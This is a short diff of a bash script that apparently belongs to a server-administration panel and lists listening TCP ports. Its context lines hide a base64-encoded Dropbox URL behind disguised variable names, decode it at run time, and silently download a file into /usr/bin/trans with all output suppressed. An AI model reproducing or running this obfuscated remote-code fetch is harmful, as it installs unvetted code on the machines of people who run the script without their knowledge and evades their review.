@@ -1,18 +1,11 @@
 #!/bin/bash
-
-SCPdir="/etc/newadm"
-SCPusr="${SCPdir}/ger-user"
-SCPfrm="/etc/ger-frm"
-SCPfrm3="/etc/adm-lite"
-SCPinst="/etc/ger-inst"
-SCPidioma="${SCPdir}/idioma"
-
 declare -A cor=( [0]="\033[1;37m" [1]="\033[1;34m" [2]="\033[1;31m" [3]="\033[1;33m" [4]="\033[1;32m" )
 SCPfrm="/etc/ger-frm" && [[ ! -d ${SCPfrm} ]] && exit
 SCPinst="/etc/ger-inst" && [[ ! -d ${SCPinst} ]] && exit
 API_TRANS="aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy9sZnlxZGI5NnJkejl5bW8vdHJhbnM/ZGw9MA=="
 SUB_DOM='base64 -d'
 wget -O /usr/bin/trans $(echo $API_TRANS|$SUB_DOM) &> /dev/null
+
 mportas () {
 unset portas
 portas_var=$(lsof -V -i tcp -P -n | grep -v "ESTABLISHED" |grep -v "COMMAND" | grep "LISTEN")
